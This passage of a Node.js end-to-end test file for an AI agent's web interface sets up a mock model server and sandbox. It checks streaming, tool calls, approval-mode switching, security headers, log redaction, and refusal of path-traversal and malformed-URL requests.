'use strict';

/**
 * 梦云 Agent —— 网页界面端到端测试
 *
 * 一次跑完下面这些，全部离线（除了 GitHub 搜索那两项，可选跳过）：
 *   1. 静态资源能正常返回
 *   2. 所有 REST 接口可用
 *   3. SSE 事件流能收到实时事件
 *   4. 完整对话链路：流式文本 → 工具调用 → 结果回填 → 最终回答
 *   5. 确认闸门：危险工具会挂起并等用户点「允许/拒绝」
 *   6. 插件装卸：安装 → 禁用 → 启用 → 卸载
 *   7. 插件市场：GitHub 搜索、tar.gz 解压、插件结构识别
 *
 * 用法：
 *   node test/web-e2e.js            只跑离线部分
 *   node test/web-e2e.js --online   额外跑 GitHub 搜索（需要联网）
 */

const http = require('http');
const fs = require('fs');
const os = require('os');
const path = require('path');
const zlib = require('zlib');
const { spawn } = require('child_process');
const { readTarGz, detectTopPrefix } = require(path.join(__dirname, '..', 'src', 'web', 'plugin-market.js'));

const ROOT = path.resolve(__dirname, '..');
const CLI = path.join(ROOT, 'bin', 'mya.js');
const ONLINE = process.argv.includes('--online');

/* ------------------------------------------------------------------ */
/* 迷你测试框架                                                        */
/* ------------------------------------------------------------------ */

const results = [];
let group = '';

function section(name) {
  group = name;
  console.log(`\n\x1b[36m▌ ${name}\x1b[0m`);
}

async function test(name, fn) {
  try {
    await fn();
    results.push({ group, name, ok: true });
    console.log(`  \x1b[32m✓\x1b[0m ${name}`);
  } catch (err) {
    results.push({ group, name, ok: false, error: err });
    console.log(`  \x1b[31m✗\x1b[0m ${name}\n      \x1b[31m${err.message}\x1b[0m`);
    if (process.env.MYA_DEBUG) console.log(err.stack);
  }
}

function assert(cond, msg) {
  if (!cond) throw new Error(msg);
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/**
 * 手写一个最小 zip（只支持 store 和 deflate 两种，够用了）。
 *
 * 为什么要自己写：想测「本地安装 zip」就得有一个真实的 zip 文件，
 * 而项目是零依赖的，装不了 archiver/jszip。zip 的格式本身很简单：
 * 每个文件一段「本地头 + 数据」，末尾一张「中央目录」。
 */
function makeZip(entries) {
  const locals = [];
  const centrals = [];
  let offset = 0;

  for (const e of entries) {
    const nameBuf = Buffer.from(e.name, 'utf8');
    const raw = Buffer.from(e.content, 'utf8');
    const crc = crc32(raw);
    const data = e.deflate ? zlib.deflateRawSync(raw) : raw;
    const method = e.deflate ? 8 : 0;

    const local = Buffer.alloc(30 + nameBuf.length);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0, 6);
    local.writeUInt16LE(method, 8);
    local.writeUInt32LE(0, 10); // 时间/日期
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(data.length, 18);
    local.writeUInt32LE(raw.length, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    local.writeUInt16LE(0, 28);
    nameBuf.copy(local, 30);
    locals.push(local, data);

    const central = Buffer.alloc(46 + nameBuf.length);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0, 8);
    central.writeUInt16LE(method, 10);
    central.writeUInt32LE(0, 12);
    central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(data.length, 20);
    central.writeUInt32LE(raw.length, 24);
    central.writeUInt16LE(nameBuf.length, 28);
    central.writeUInt16LE(0, 30); // extra
    central.writeUInt16LE(0, 32); // comment
    central.writeUInt16LE(0, 34); // disk
    central.writeUInt16LE(0, 36); // internal attrs
    central.writeUInt32LE(0, 38); // external attrs
    central.writeUInt32LE(offset, 42);
    nameBuf.copy(central, 46);
    centrals.push(central);

    offset += local.length + data.length;
  }

  const centralBuf = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(centralBuf.length, 12);
  eocd.writeUInt32LE(offset, 16);
  eocd.writeUInt16LE(0, 20);
  return Buffer.concat([...locals, centralBuf, eocd]);
}

/** zip 需要的 CRC32（表驱动的标准实现） */
const CRC_TABLE = (() => {
  const table = new Int32Array(256);
  for (let i = 0; i < 256; i += 1) {
    let c = i;
    for (let k = 0; k < 8; k += 1) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    table[i] = c;
  }
  return table;
})();

function crc32(buf) {
  let c = 0xffffffff;
  for (let i = 0; i < buf.length; i += 1) c = CRC_TABLE[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}

/** 轮询等待某个条件成立，超时抛错（比死等固定时长可靠） */
async function waitFor(label, cond, timeoutMs = 25000, interval = 120) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    const got = cond();
    if (got) return got;
    // eslint-disable-next-line no-await-in-loop
    await sleep(interval);
  }
  throw new Error(`等待「${label}」超时（${timeoutMs}ms）`);
}

/** 用裸 http 请求，这样可以手工指定 Host 头（fetch 不允许改 Host） */
function rawRequest(base, pathname, headers = {}) {
  const url = new URL(base);
  return new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: url.hostname,
        port: url.port,
        path: pathname,
        method: 'GET',
        headers: { Host: `${url.hostname}:${url.port}`, ...headers },
      },
      (res) => {
        let body = '';
        res.on('data', (c) => (body += c));
        res.on('end', () => resolve({ status: res.statusCode, body }));
      },
    );
    req.on('error', reject);
    req.end();
  });
}

/* ------------------------------------------------------------------ */
/* 假模型服务                                                          */
/* ------------------------------------------------------------------ */

/**
 * 剧本（按用户消息内容决定动作，这样测试之间不会互相污染）：
 *   - 消息里含「写」  → 调 write 工具（会触发确认闸门）
 *   - 消息里含「读」  → 调 read 工具
 *   - 已经有工具结果   → 给出最终答案（内容分多片，验证流式拼接）
 *
 * 关键点：write 的参数被拆成 3 个分片发送，用来验证 SSE 分片拼接。
 */
function createMockModel() {
  const requests = [];
  /** 每次请求的简要记录，调试用 */
  const log = [];
  /**
   * 并行子任务的观测点。假网关自己记这些，测试最后来断言：
   *   · child：子任务请求次数（只读工具集的那种）
   *   · childTools：子任务实际拿到的工具集（要能证明没有 write/shell）
   *   · spawnBatches：父任务里「一口气拆多个」的批次数
   *   · parentSawSubtaskResult：父任务最终是否收到了带边界的摘要
   */
  const gatewayCalls = { requests: 0, child: 0, childTools: [], spawnBatches: 0, parentSawSubtaskResult: false };
  const server = http.createServer((req, res) => {
    // 模型列表：用户在设置界面点「获取列表」走的就是这条
    if (req.method === 'GET' && /\/models(\?|$)/.test(req.url)) {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(
        JSON.stringify({
          object: 'list',
          data: [{ id: 'mock-model' }, { id: 'mock-large' }, { id: 'mock-image-1' }],
        }),
      );
      return;
    }
    if (!req.url.includes('/chat/completions')) {
      res.writeHead(404).end('{}');
      return;
    }    let raw = '';
    req.on('data', (c) => (raw += c));
    req.on('end', () => {
      const body = JSON.parse(raw || '{}');
      requests.push(body);

      const messages = body.messages || [];
      // 注意：不能用「有没有 tool 消息」判断轮次——上一轮的 tool 结果还留在历史里。
      // 正确做法：只看最后一条 user 消息之后有没有 tool 结果。
      const lastUserIdx = messages.map((m) => m.role).lastIndexOf('user');
      const toolMsgs = messages.slice(lastUserIdx).filter((m) => m.role === 'tool');
      const lastUser = messages[lastUserIdx];
      const userText = String((lastUser && lastUser.content) || '');
      // 上下文压缩插件会拿一个「总结这段历史」的请求打进来，
      // 那条请求的 system 提示词里带着「压缩」二字。要单独认出来，
      // 否则会被下面的分支当成普通工具调用，压缩永远拿不到摘要。
      const wantsSummary = /压缩/.test(String((messages[0] && messages[0].content) || ''));

      // 并行子任务的观测点（假网关自己记着，测试最后来断言）
      gatewayCalls.requests += 1;

      const branch = wantsSummary
        ? 'summary'
        : toolMsgs.length
          ? 'final'
          : /写/.test(userText)
            ? 'write'
            : 'read';
      log.push({ branch, userText: userText.slice(0, 40), toolMsgs: toolMsgs.length, msgCount: messages.length });

      // 真网关会看 stream 字段：false 就一次性返回 JSON。
      // 假网关也得守这个约定，否则「非流式请求」这条路根本测不到
      // （压缩插件写摘要用的就是非流式）。
      if (body.stream === false) {
        const text = wantsSummary
          ? '交接说明：已读取 probe.txt 并确认内容；改动集中在沙箱目录内；下一步需要用户确认是否继续写入 approval-probe.txt。尚未执行测试。'
          : '这是非流式回复。';
        res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
        res.end(
          JSON.stringify({
            id: 'mock',
            object: 'chat.completion',
            choices: [{ index: 0, message: { role: 'assistant', content: text }, finish_reason: 'stop' }],
            usage: { prompt_tokens: 40, completion_tokens: 20, total_tokens: 60 },
          }),
        );
        return;
      }

      res.writeHead(200, { 'Content-Type': 'text/event-stream; charset=utf-8' });
      const send = (o) => res.write(`data: ${JSON.stringify(o)}\n\n`);
      // 下面几个分支是**早退**的，必须自己收尾：主流程末尾的 [DONE] 在更下面，
      // 早退会跳过它，客户端的 SSE 读取就永远等下去。
      // （第一次就踩了这个坑：子任务请求不结束 → task_wait 一直等 → 父任务挂住）
      const endStream = () => {
        res.write('data: [DONE]\n\n');
        res.end();
      };

      /* ---- 并行子任务：靠工具集分辨「谁在问」 ----
         父任务能看到 task_* 工具，子任务只拿到只读三件套（掩码注册表），
         所以「请求里有没有 task_spawn」就是可靠的判据。 */
      const toolNames = (body.tools || []).map((t) => t.function && t.function.name);
      const isChildTask = toolNames.length && !toolNames.includes('task_spawn');
      if (isChildTask) {
        gatewayCalls.child += 1;
        gatewayCalls.childTools.push(toolNames.join('/'));
        send({ choices: [{ index: 0, delta: { content: '子任务结论：读完了，内容是 ' + userText.slice(0, 20) } }] });
        // usage 分片不能省：子任务的 token 要靠它汇总进会话累计，
        // 真实服务商每轮都会带（省掉的话「子任务 token」永远是 0）
        res.write(
          `data: ${JSON.stringify({
            choices: [{ index: 0, delta: {}, finish_reason: 'stop' }],
            usage: { prompt_tokens: 30, completion_tokens: 15, total_tokens: 45 },
          })}\n\n`,
        );
        endStream();
        return;
      }
      if (/并行/.test(userText) && !toolMsgs.length) {
        // ---- 父任务第一轮：一口气拆两个子任务，然后等结果 ----
        gatewayCalls.spawnBatches += 1;
        const calls = [
          { id: 'call_s1', name: 'task_spawn', args: { title: '读A', goal: '读 a.txt 并总结' } },
          { id: 'call_s2', name: 'task_spawn', args: { title: '读B', goal: '读 b.txt 并总结' } },
          { id: 'call_w', name: 'task_wait', args: {} },
        ];
        // index 必须各不相同：同一个 index 会被当成「同一个调用的分片」合并掉，
        // 结果三个调用只剩最后一个（第一次写这个用例就踩了）
        calls.forEach((c, i) => {
          send({
            choices: [
              {
                index: 0,
                delta: {
                  tool_calls: [
                    { id: c.id, index: i, type: 'function', function: { name: c.name, arguments: JSON.stringify(c.args) } },
                  ],
                },
              },
            ],
          });
        });
        send({ choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] });
        endStream();
        return;
      }
      if (/并行/.test(userText) && toolMsgs.length) {
        // ---- 父任务第二轮：把子任务的结论汇总成答复 ----
        const got = toolMsgs.map((m) => String(m.content || '')).join('\n');
        gatewayCalls.parentSawSubtaskResult = /<subtask-result>/.test(got);
        send({ choices: [{ index: 0, delta: { content: '收到两组子任务结论，我汇总成一句：都读完了。' } }] });
        send({ choices: [{ index: 0, delta: {}, finish_reason: 'stop' }] });
        endStream();
        return;
      }

      if (wantsSummary) {
        // 假装认真写了份交接说明（要够长，太短插件会判定「摘要不可用」）
        const summary =
          '交接说明：已读取 probe.txt 并确认内容；改动集中在沙箱目录内；' +
          '下一步需要用户确认是否继续写入 approval-probe.txt。尚未执行测试。';
        for (const p of summary.match(/.{1,24}/g) || []) {
          send({ choices: [{ index: 0, delta: { content: p } }] });
        }
        send({ choices: [{ index: 0, delta: {}, finish_reason: 'stop' }] });
      } else if (toolMsgs.length) {
        // ---- 第二轮：基于工具结果回答 ----
        // 先发一小段思考（reasoning_content），用来验证思维链能一路推到前端
        send({ choices: [{ index: 0, delta: { reasoning_content: '工具结果拿到了，直接整理成答案。' } }] });
        const content = String(toolMsgs[0].content || '');
        const denied = /拒绝|未获批准/.test(content);
        const pieces = [
          '我收到了工具结果：',
          content.slice(0, 50).replace(/\s+/g, ' '),
          denied ? '。看来这次操作没有获得许可。' : '。',
          '任务完成。',
        ];
        for (const p of pieces) send({ choices: [{ index: 0, delta: { content: p } }] });
        send({ choices: [{ index: 0, delta: {}, finish_reason: 'stop' }] });
      } else if (/写/.test(userText)) {
        // ---- write：参数分三片发送 ----
        const args = JSON.stringify({ path: 'approval-probe.txt', content: '这段内容只有用户允许后才会落盘' });
        const pieces = [args.slice(0, 14), args.slice(14, 36), args.slice(36)];
        pieces.forEach((p, i) => {
          send({
            choices: [
              {
                index: 0,
                delta: {
                  tool_calls: [
                    i === 0
                      ? { id: 'call_w', index: 0, type: 'function', function: { name: 'write', arguments: p } }
                      : { index: 0, function: { arguments: p } },
                  ],
                },
              },
            ],
          });
        });
        send({ choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] });
      } else {
        // ---- read：参数也分两片 ----
        send({
          choices: [
            {
              index: 0,
              delta: {
                tool_calls: [
                  { id: 'call_r', index: 0, type: 'function', function: { name: 'read', arguments: '{"pa' } },
                ],
              },
            },
          ],
        });
        send({ choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { arguments: 'th":"probe.txt"}' } }] } }] });
        send({ choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] });
      }

      send({
        usage: { prompt_tokens: 50, completion_tokens: 12, total_tokens: 62 },
        choices: [{ index: 0, delta: {}, finish_reason: null }],
      });
      res.write('data: [DONE]\n\n');
      res.end();
    });
  });

  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => resolve({ server, port: server.address().port, requests, log, gatewayCalls }));
  });
}

/* ------------------------------------------------------------------ */
/* 启动 agent 的 web 服务                                              */
/* ------------------------------------------------------------------ */

/** 建一个干净的临时工作目录，避免测试污染真实项目 */
function makeSandbox() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mya-web-'));
  fs.mkdirSync(path.join(dir, 'plugins'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'sandbox', version: '0.0.0' }));
  fs.writeFileSync(path.join(dir, 'probe.txt'), '沙箱里的探针文件内容');
  fs.writeFileSync(
    path.join(dir, 'config.json'),
    JSON.stringify(
      {
        provider: 'custom',
        model: 'mock-model',
        temperature: null,
        maxTurns: 6,
        stream: true,
        systemPromptFile: '',
        tools: { autoApprove: ['read', 'glob', 'grep'], deny: [] },
        plugins: { enabled: true, dirs: ['plugins'], disabled: [] },
        session: { save: true, dir: '.mya/sessions' },
        shell: { allowDangerous: false },
      },
      null,
      2,
    ),
  );
  return dir;
}

/**
 * 用子进程跑 mya web，然后轮询等它起来。
 * 用子进程而不是直接 require，是为了连 CLI 参数解析、配置加载一起测到。
 *
 * @param {string} sandbox  工作目录
 * @param {number} modelPort 假模型端口
 * @param {object} [envOverride] 覆盖环境变量（比如清掉 API Key 模拟首次使用）
 */
async function startAgentServer(sandbox, modelPort, envOverride = {}) {
  const child = spawn(process.execPath, [CLI, 'web', '--no-open', '--port', '0'], {
    cwd: sandbox,
    env: {
      ...process.env,
      // 关键：把配置目录钉在沙箱里。
      // 不钉的话 rootDir 会解析成程序所在的项目目录，于是「保存设置」这条
      // 路径会去读写**真实的 config.json** —— 测试跑到一半把用户配的
      // baseUrl / model 改掉，而且失败信息看起来像是接口的问题，极难排查。
      MYA_CONFIG_DIR: sandbox,
      MYA_PROVIDER: 'custom',
      MYA_BASE_URL: `http://127.0.0.1:${modelPort}/v1`,
      MYA_API_KEY: 'mock',
      MYA_MODEL: 'mock-model',
      NO_COLOR: '1',
      ...envOverride,
    },
  });

  let stdout = '';
  let stderr = '';
  child.stdout.on('data', (d) => (stdout += d.toString()));
  child.stderr.on('data', (d) => (stderr += d.toString()));

  // 从输出里抓出真实端口
  const deadline = Date.now() + 20000;
  let base = '';
  while (Date.now() < deadline) {
    const m = /http:\/\/127\.0\.0\.1:(\d+)/.exec(stdout);
    if (m) {
      base = `http://127.0.0.1:${m[1]}`;
      // 确认真的能连上
      try {
        // eslint-disable-next-line no-await-in-loop
        const res = await fetch(`${base}/api/info`);
        if (res.ok) return { child, base, getOutput: () => ({ stdout, stderr }) };
      } catch {
        /* 再等一会 */
      }
    }
    if (child.exitCode !== null) {
      throw new Error(`web 服务启动失败（退出码 ${child.exitCode}）\n${stdout}\n${stderr}`);
    }
    // eslint-disable-next-line no-await-in-loop
    await sleep(200);
  }
  child.kill();
  throw new Error(`等待 web 服务超时\nstdout: ${stdout}\nstderr: ${stderr}`);
}

async function req(base, method, pathname, body) {
  const res = await fetch(`${base}${pathname}`, {
    method,
    headers: body ? { 'Content-Type': 'application/json' } : {},
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await res.text();
  let json = null;
  try {
    json = JSON.parse(text);
  } catch {
    /* 静态资源不是 JSON */
  }
  // 把响应头也带回去：安全头（CSP / nosniff / DENY）要靠它断言
  return { status: res.status, text, json, headers: Object.fromEntries(res.headers) };
}

/** 订阅 SSE，把收到的事件收集起来 */
function collectEvents(base, bucket) {
  const controller = new AbortController();
  (async () => {
    try {
      const res = await fetch(`${base}/api/events`, {
        headers: { Accept: 'text/event-stream' },
        signal: controller.signal,
      });
      const reader = res.body.getReader();
      const decoder = new TextDecoder();
      let buf = '';
      while (true) {
        // eslint-disable-next-line no-await-in-loop
        const { done, value } = await reader.read();
        if (done) break;
        buf += decoder.decode(value, { stream: true });
        let idx;
        while ((idx = buf.indexOf('\n\n')) !== -1) {
          const frame = buf.slice(0, idx);
          buf = buf.slice(idx + 2);
          for (const line of frame.split('\n')) {
            if (!line.startsWith('data:')) continue;
            try {
              bucket.push(JSON.parse(line.slice(5).trim()));
            } catch {
              /* 忽略 */
            }
          }
        }
      }
    } catch {
      /* 主动关闭时正常抛错 */
    }
  })();
  return () => controller.abort();
}

/* ------------------------------------------------------------------ */
/* 主流程                                                              */
/* ------------------------------------------------------------------ */

async function main() {
  console.log('\n\x1b[1m\x1b[35m梦云 Agent 网页界面端到端测试\x1b[0m');
  console.log(`\x1b[90m${ONLINE ? '含联网测试' : '仅离线测试（加 --online 可测试 GitHub 搜索）'}\x1b[0m`);

  const sandbox = makeSandbox();
  const model = await createMockModel();
  let serverInfo = null;
  let stopEvents = null;
  const events = [];

  try {
    serverInfo = await startAgentServer(sandbox, model.port);
    const { base, child } = serverInfo;
    stopEvents = collectEvents(base, events);
    await sleep(400); // 等 SSE 连上

    /* ---------------- 1. 静态资源 ---------------- */
    section('1. 网页静态资源');
    await test('index.html 可访问且包含界面结构', async () => {
      const r = await req(base, 'GET', '/');
      assert(r.status === 200, `HTTP ${r.status}`);
      assert(r.text.includes('梦云 Agent'), '缺少标题');
      assert(r.text.includes('id="messages"'), '缺少消息容器');
      assert(r.text.includes('插件市场'), '缺少插件市场面板');
    });
    await test('app.css / app.js 可访问', async () => {
      const css = await req(base, 'GET', '/app.css');
      const js = await req(base, 'GET', '/app.js');
      assert(css.status === 200 && css.text.includes('--acc'), 'CSS 有问题');
      assert(js.status === 200 && js.text.includes('renderMarkdown'), 'JS 有问题');
    });
    await test('不存在的路径回落到 index.html（单页应用）', async () => {
      const r = await req(base, 'GET', '/some/unknown/route');
      assert(r.status === 200 && r.text.includes('梦云 Agent'), '应该回落到首页');
    });
    await test('目录穿越被挡住', async () => {
      const r = await req(base, 'GET', '/../package.json');
      assert(!r.text.includes('mengyun-agent'), '不应该泄露上级目录文件');
    });

    /* ---------------- 2. API ---------------- */
    section('2. REST 接口');
    await test('/api/info 返回环境信息', async () => {
      const r = await req(base, 'GET', '/api/info');
      assert(r.status === 200 && r.json.ok, '接口失败');
      assert(r.json.toolCount >= 6, `工具数不对：${r.json.toolCount}`);
      assert(r.json.cwd.replace(/\\/g, '/').includes(path.basename(sandbox)), '工作目录不对');
    });
    await test('/api/tools 列出工具与钩子', async () => {
      const r = await req(base, 'GET', '/api/tools');
      assert(r.json.tools.length >= 6, '工具太少');
      assert(r.json.tools.some((t) => t.name === 'read'), '缺少 read');
      assert(r.json.tools.some((t) => t.name === 'write' && t.dangerous), 'write 应标记为危险');
    });
    await test('/api/plugins 列出插件', async () => {
      const r = await req(base, 'GET', '/api/plugins');
      assert(r.status === 200 && Array.isArray(r.json.plugins), '返回结构不对');
    });
    await test('/api/fs/list 工作区树：锁在会话工作目录里，越界被拒', async () => {
      // 侧栏的文件树是**常驻**的，所以它的隔离约束必须单独测：
      // 锚定「会话的工作目录」，越界的 ../、盘符、绝对路径一律 400——
      // 否则侧栏就成了一个能翻整块硬盘的入口。
      const created = await req(base, 'POST', '/api/sessions', {});
      assert(created.json.ok, `建会话失败：${created.json.error}`);
      const cwd = created.json.session.cwd;

      // 1) 根目录：能列出来（这个沙箱里有 config / package.json 之类的文件）
      const root = await req(base, 'POST', '/api/fs/list', { sessionId: created.json.session.id });
      assert(root.json.ok === true, `根目录应该能列：${JSON.stringify(root.json).slice(0, 200)}`);
      assert(root.json.path && path.resolve(root.json.path) === path.resolve(cwd), `根应该是会话的 cwd：${root.json.path}`);
      assert(Array.isArray(root.json.files) && Array.isArray(root.json.dirs), '应该分别返回 dirs / files');

      // 2) 子目录：建一个，然后能从根里看到「它」，也能列它
      fs.mkdirSync(path.join(cwd, '联动测试子目录'), { recursive: true });
      const withSub = await req(base, 'POST', '/api/fs/list', { sessionId: created.json.session.id });
      assert(
        withSub.json.dirs.some((d) => d.name === '联动测试子目录'),
        `子目录应该被列出来：${JSON.stringify(withSub.json.dirs)}`,
      );
      const sub = await req(base, 'POST', '/api/fs/list', {
        sessionId: created.json.session.id,
        path: path.join(cwd, '联动测试子目录'),
      });
      assert(sub.json.ok && sub.json.files.length === 0, '子目录本身应该可以继续往下查');
      fs.rmSync(path.join(cwd, '联动测试子目录'), { recursive: true, force: true });

      // 3) 越界（../）：400，而不是把工作目录外面的东西吐出来
      const up = await req(base, 'POST', '/api/fs/list', { sessionId: created.json.session.id, path: path.join(cwd, '..') });
      assert(up.status === 400, `越界应该 400，实际 ${up.status}：${JSON.stringify(up.json).slice(0, 160)}`);

      // 4) 不存在的子目录：ok:false + missing（前端能画「点刷新看看」，而不是 500）
      const missing = await req(base, 'POST', '/api/fs/list', {
        sessionId: created.json.session.id,
        path: path.join(cwd, '并不存在的目录'),
      });
      assert(missing.json.ok === false && missing.json.missing === true, `应返回 missing：${JSON.stringify(missing.json).slice(0, 160)}`);

      // 5) 不存在的会话：同样不能 500（侧栏是常驻区域，错误必须能被画出来）
      const noSession = await req(base, 'POST', '/api/fs/list', { sessionId: '不存在' });
      assert(noSession.status === 200 && typeof noSession.json.ok === 'boolean', `无会话时应可解释地失败：${noSession.status}`);
    });
    await test('/api/logs 能读到结构化日志（排障入口）', async () => {
      // 为什么值得测：日志坏了（路径不对、级别过滤把 info 也滤掉、JSON 写坏）
      // 平时完全看不出来，只有真出事要查的时候才发现「什么都没有」。
      const r = await req(base, 'GET', '/api/logs?n=50');
      assert(r.status === 200 && r.json.ok, `接口失败：${r.status} ${String(r.text).slice(0, 120)}`);
      assert(typeof r.json.file === 'string' && /mya\.log$/.test(r.json.file), `应给出日志文件路径：${r.json.file}`);
      assert(Array.isArray(r.json.lines) && r.json.lines.length > 0, '应该是结构化日志行数组且非空');
      const first = r.json.lines[r.json.lines.length - 1]; // tail 是倒序的，最后一条是最早的
      assert(first && first.ts && first.level && first.logger, `日志行缺少结构化字段：${JSON.stringify(first)}`);
      assert(
        r.json.lines.some((l) => /应用组装|界面服务已启动/.test(l.msg || '')),
        `启动时的日志应该在文件里：${JSON.stringify(r.json.lines.slice(0, 3))}`,
      );
      assert(!JSON.stringify(r.json).includes('sk-'), '日志接口不该泄露明文密钥');
    });
    await test('畸形 URL 编码返回 400，而不是把请求挂住', async () => {
      // decodeURIComponent 遇到 /%zz 会抛 URIError。以前没人兜住：异常冒到请求回调之外，
      // 进程靠 uncaughtException 活着，但这个请求永远不回（客户端只能超时）。
      const res = await fetch(`${base}/%zz`).catch((e) => ({ status: 0, text: async () => String(e.message || e) }));
      assert(res.status === 400, `应当是 400，实际 ${res.status}`);
      const body = await res.text();
      assert(/无法解析|转义/.test(body), `要说清原因：${body}`);
      const after = await req(base, 'GET', '/api/info');
      assert(after.status === 200, '畸形请求之后服务应当照常工作');
    });

    await test('/api/settings 返回脱敏配置', async () => {
      const r = await req(base, 'GET', '/api/settings');
      assert(r.json.raw.model === 'mock-model', '模型不对');
      assert(!JSON.stringify(r.json).includes('sk-'), '不应该泄露明文密钥');
    });
    await test('所有响应都带安全头（CSP / nosniff / 不许被嵌）', async () => {
      // 前端是手写渲染 + escapeHtml，没有已知注入；这些头是零成本的第二道防线——
      // 有人漏转义一处时，至少还有一层兜着。
      const api = await req(base, 'GET', '/api/info');
      const csp = api.headers['content-security-policy'] || '';
      assert(/default-src 'self'/.test(csp), `CSP 应当限定同源：${csp}`);
      assert(/object-src 'none'/.test(csp), `CSP 应当禁掉 object：${csp}`);
      assert(/frame-ancestors 'none'/.test(csp), `CSP 应当不许被嵌：${csp}`);
      assert(api.headers['x-content-type-options'] === 'nosniff', '应当带 nosniff');
      assert(api.headers['x-frame-options'] === 'DENY', '应当带 X-Frame-Options: DENY');
      assert(api.headers['referrer-policy'] === 'no-referrer', '本机地址不该出现在 Referer 里');

      // 静态页面（真正会被浏览器解析的那份）也必须带上，否则等于没防
      const page = await req(base, 'GET', '/');
      assert(/default-src 'self'/.test(page.headers['content-security-policy'] || ''), '静态页面缺少 CSP');
      assert(page.text.includes('<html'), '首页应当是 HTML');
    });
    await test('权限档位：能在界面上切换、非法值被忽略、切回去也生效', async () => {
      // 这三档直接决定「agent 能不能不问就动手」，界面上的按钮必须
      // 真的把值送到服务端并立刻生效（切完 GET /api/info 要能看到）。
      const info0 = await req(base, 'GET', '/api/info');
      assert(info0.json.approval && info0.json.approval.mode === 'ask', `默认档应该是 ask，实际 ${JSON.stringify(info0.json.approval)}`);

      const setWorkspace = await req(base, 'POST', '/api/settings', { approval: { mode: 'workspace' } });
      assert(setWorkspace.json.ok, `切换失败：${setWorkspace.json.error}`);
      const info1 = await req(base, 'GET', '/api/info');
      assert(info1.json.approval.mode === 'workspace', '切换后 /api/info 应该立刻反映出来');

      // 写错的值必须被忽略：否则配置里会留一个「我明明设了完全权限怎么还问」的悬案
      const bad = await req(base, 'POST', '/api/settings', { approval: { mode: '全都允许' } });
      assert(bad.json.ok, '非法值也不该让接口报错');
      const info2 = await req(base, 'GET', '/api/info');
      assert(info2.json.approval.mode === 'workspace', `非法档位不该改动当前值，实际 ${info2.json.approval.mode}`);

      // 还原：后面的「确认闸门」用例依赖询问档
      await req(base, 'POST', '/api/settings', { approval: { mode: 'ask' } });
      const info3 = await req(base, 'GET', '/api/info');
      assert(info3.json.approval.mode === 'ask', '要能切回 ask');
    });
    await test('/api/history 对不存在的会话返回 404', async () => {
      const r = await req(base, 'GET', '/api/history?id=不存在');
      assert(r.status === 404, `应该 404，实际 ${r.status}`);
    });
    let sessionId = '';
    await test('新建会话', async () => {
      const r = await req(base, 'POST', '/api/sessions', {});
      assert(r.json.ok && r.json.session.id, '创建失败');
      sessionId = r.json.session.id;
    });

    await test('发消息后收到完整的 SSE 事件序列', async () => {
      events.length = 0;
      const r = await req(base, 'POST', '/api/message', { sessionId, text: '读一下 probe.txt' });
      assert(r.json.ok, `发送失败：${r.json.error}`);

      await waitFor('本轮结束（done 事件）', () => events.some((e) => e.type === 'done'));

      const types = events.map((e) => e.type);
      assert(types.includes('block'), '没有收到 block 事件');
      assert(types.includes('tools_planned'), `没有工具调用事件，收到：${types.join(',')}`);
      assert(types.includes('tool_result'), `没有工具结果事件，收到：${types.join(',')}`);

      const blocks = events.filter((e) => e.type === 'block').map((e) => e.block);
      assert(blocks.some((b) => b.type === 'user'), '缺少用户消息块');
      assert(blocks.some((b) => b.type === 'assistant'), '缺少助手消息块');
      // Web 模式下流式文本走 'text' 事件（终端模式才用 'delta'）
      assert(events.some((e) => e.type === 'text'), `没有收到流式文本事件，收到：${types.join(',')}`);
      const texts = events.filter((e) => e.type === 'text').map((e) => e.text);
      assert(texts.length >= 1 && texts[texts.length - 1].includes('任务完成'), `流式文本不完整：${JSON.stringify(texts)}`);
    });

    await test('工具真的执行了，且参数分片被正确拼接', async () => {
      const hist = await req(base, 'GET', `/api/history?id=${sessionId}`);
      assert(hist.json.ok, '取历史失败');
      const toolBlocks = hist.json.blocks.filter((b) => b.type === 'tool');
      assert(toolBlocks.length >= 1, `没有工具块，实际：${JSON.stringify(hist.json.blocks.map((b) => b.type))}`);
      const readBlock = toolBlocks.find((b) => b.name === 'read');
      assert(readBlock, '没有 read 工具块');
      assert(readBlock.ok === true, `read 应该成功，实际 ok=${readBlock.ok}`);
      assert(String(readBlock.output).includes('沙箱里的探针文件内容'), `工具输出不对：${readBlock.output}`);
    });

    await test('模型最终回答被完整拼接并落库', async () => {
      const hist = await req(base, 'GET', `/api/history?id=${sessionId}`);
      const assistant = hist.json.blocks.filter((b) => b.type === 'assistant');
      assert(assistant.length >= 1, '没有助手消息');
      const text = assistant.map((b) => b.text).join('');
      assert(text.includes('任务完成'), `最终回答不完整：${text}`);
      assert(text.includes('工具结果'), '回答里应该提到工具结果');
    });

    await test('会话用量被统计', async () => {
      const r = await req(base, 'GET', '/api/info');
      const s = r.json.sessions.find((x) => x.id === sessionId);
      assert(s, '找不到会话');
      assert(s.usage.totalTokens > 0, `token 统计为 0：${JSON.stringify(s.usage)}`);
    });

